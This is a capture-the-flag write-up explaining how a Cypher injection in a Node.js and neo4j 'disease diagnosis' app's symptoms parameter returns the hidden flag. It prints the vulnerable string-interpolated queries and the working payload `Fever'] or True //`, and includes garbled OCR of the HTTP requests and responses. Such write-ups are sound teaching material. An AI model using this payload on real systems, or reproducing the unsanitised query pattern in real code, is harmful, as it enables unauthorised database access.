# Dead or Alive
> We have developed an innovative disease detection system using graph theory. Come and test our system, all your personal data is securely protected

## About the Challenge
We were given a source code (You can download the source code [here](source.zip)) and a website, here is the preview of the website


[Image extracted text: HealthGraph
Home
About Us
M
Contact +7 499 110 25 34
AI Powered Diseases Diagnosis
Urology
Neurology
Orthopedic
Cardiologist
Dentist
Urology]


In this website, there is a form where we can input the SSN (Social Security Number), full name, birth date, weight, and the symptoms.


[Image extracted text: Try it out
Here You can access Al powered diseases diagnosis system: You can choose several
symptoms by which your diagnoses will be determined:
test
12/12/12
10
Find your symptoms
Sore throat
Add
Current symptoms
Fever
Cough 0
By clicking the submit button; you agree that we will store your data in order to further research in the field of medicine
and improve our service: Data will be anonymized:
Submit]


The website will generate the possible diseases we may suffer from based on the symptoms


[Image extracted text: Status: Diagnosis found
Influenza 0
Pneumonia
Death 0]


## How to Solve?
Let's check the source code first, there is a file called `app.js`

```js
import express from 'express';
import nunjucks from 'nunjucks';
import neo4j from 'neo4j-driver';
import md5 from 'md5'
import moment from 'moment'
```

It looks like this website using `node` as a backend, `nunjucks` as a templating engine, and `neo4j` as a database. There are 3 endpoints that we can use:

* /api/setUser
* /api/setSymptoms
* /api/getDiagnosis

When the user called `/api/setUser` endpoint, the code will call `setUser` function. Here is the content of `setUser` function

```js
async function setUser(ssn, name, yearOfBirth, weight){
    const session = driver.session();
    const q = `
        MERGE (p:Patient {
                    ssn: '${ssn}'
                })
        ON CREATE SET p.since = date()
        SET p.name = '${name}'
        SET p.yearOfBirth = ${yearOfBirth}
        SET p.weight = ${weight}
    `
    return session.run(q)
            .catch(() => {})
            .then(() => session.close());
}
```

When the user called `/api/setSymptoms` endpoint, the code will call `setSymptoms` function. Here is the content of `setSymptoms` function

```js
async function setSymptoms(ssn, symptoms){
    const session = driver.session();
    let q = `
        MATCH (p:Patient {ssn: '${ssn}'})
        MATCH (s:Symptom) WHERE s.name in [${symptoms}]
        MERGE (p)-[r:HAS]->(s)
    `;
    return session.run(q)
            .catch(() => {})
            .then(() => session.close());
}
```

When the user called `/api/getDiagnosis` endpoint, the code will call `getDiagnosis` function. Here is the content of `getDiagnosis` function

```js
async function getDiagnosis(ssn){
    const session = driver.session();
    const q = `
        // get patient symptoms as array
        MATCH (p:Patient {ssn: '${ssn}'})-[:HAS]->(s:Symptom)-[:OF]->(d:Disease)
        WITH d, collect(s.name) AS p_symptoms
        
        // looking for a match of the patient's symptoms in the symptoms of diseases
        MATCH (d)<-[:OF]-(d_symptom:Symptom)
        WITH d, p_symptoms, collect(d_symptom.name) as d_symptoms
        WHERE size(p_symptoms) = size(d_symptoms)
        RETURN d.name, d.description
    `;
    const result = await session.run(q).catch(() => {});
    session.close();
    return result?.records.map((record) => ({
            name: record.get('d.name'),
            description: record.get('d.description')
    }));
}
```

It looks like there is no filter in the user input. So, these 3 endpoints is vulnerable to Cypher Injection. But if we check the routes again, There is a filter that limits our input:

* /api/setUser
  * SSN: There is a limit of characters (9 characters)
  * Full name: The program hashed our input
  * Year of Birth: Date format (DD-MM-YYYY)
  * Weight: Only accept float as a user input
* /api/setSymptoms
  * SSN: There is a limit of characters (9 characters)
  * Symptom: No filter
* /api/getDiagnosis
  * SSN: There is a limit of characters (9 characters)

So we can only exploit the website in the `symptom` parameter. For this chall, the flag was located in the disease table. To obtain the flag, we need to input `Fever'] or True //` in the `symptom` parameter. The neo4j query will run like this

```
MATCH (p:Patient {ssn: '000000001'})
MATCH (s:Symptom) WHERE s.name in ['Fever'] or True //']
MERGE (p)-[r:HAS]->(s)
```


[Image extracted text: POST
[apilsecSyptons
HTTP/2
Host
dead-or-alive
ctfz-
one
User-Agent
Hozilla/5
(Vindous
IT
0; Vin64 ;
{64;
rv:109
Accept
applicat
on/ Json
Aecept-Language
en-US
en;
1ccept
Encoding:
gzip ,
deflace
Referer
https:
dead-or-alive
ccfz
one/
Content
Type
application/ Json
Content-
Lengch:
Origin
https: / / dead-or-alive_
ct fz.
one
Sec-
etch-Dest:
empty
Sec-
etch
Hode
cors
Sec--
etch-Sice
sa e
origin
Te:
crailers
ssn
123123"
symptons
Fever
True
1 / "
4-0]


And then hit `/api/getDiagnosis` to obtain the flag


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[apil
getDiagnosis HTTP/=
HTTP / 2
200
OK
Host
dead-or -
1ve
ctfz_
Dle
Date-
Su
Lug 2023
16: 47: 04
GHT
User-Agent
Hozilla/ 5
(Vindous
IT
10
Vin64;
{64;
17:109
Geclo/:O100101
Content_
Type
applicat
on/ json;
charsetsut f-8
Firefor/115
Content
Lengch:
1558
Aecept
applicat
on/json
Vary:
Aecept
Enc
ding
5 Accept-Language
en-US
en ; 4-0 - 5
Etag:
616-P
fvsBtorofBlSGslIqUaldf"
Accept
Encoding:
gzip,
deflace
X-Powered-By:
Express
Referer
https
7 [ dead-or-alive
Ct f2
one/
Strict
Transport-
Security:
maz-
age-15724800;
includeSubDonains
Content-
Type
applicat
on/ json
Content-Lengch:
Origin:
https: / / dead-or-alive_
ccfz
one
scacus
"Diagnosis
fotd"
Sec--
etch-
Dest :
empty
message
Sec-
etch-Hode
cors
Sec-Fetch-Site:
sae
origin
nane
Influenza"
Te:
crailers
description
Influenza
Viral
infection
that
attacrs
Your
respiratory systen
Your
nose ,
chroac
and
lungs
ssn
"123123"
nane
Pneuonia"
description
Pneunonia
infection
hac
inflanes
che
air
sacs
1n
one
boch lungs
nane
Death
description
Tou
are
dead,
Tou
receite
posthunous flag:
ct fzone {C4n
Th3 D34D
P14Y_CTF? } "
nane
Conmon
cold"
description
The
comhon
cold
is
Viral
in fection
of Your
nose
ad
thr
(upper respiratory
cract
ghnk: =]


You can see the flag in the description of the disease

```
ctfzone{C4n_Th3_D34D_Pl4y_CTF?}
```